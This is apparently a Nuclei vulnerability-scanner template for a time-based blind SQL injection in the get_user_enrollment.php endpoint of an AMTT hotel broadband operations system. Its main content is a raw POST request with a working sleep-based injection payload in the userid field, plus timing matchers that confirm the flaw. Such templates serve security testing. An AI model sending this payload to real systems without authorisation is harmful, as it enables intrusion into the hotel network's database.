id: amtt-hiboss-get_user_enrollment-sqli
info:
  name: 安美数字酒店宽带运营系统 get_user_enrollment - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
  tags: amtt,sqli,time

http:
  - raw:  
      - |
        @timeout: 15s
        POST /user/get_user_enrollment.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 94

        userid=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&usermac=1&portaltype=&portalname=

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and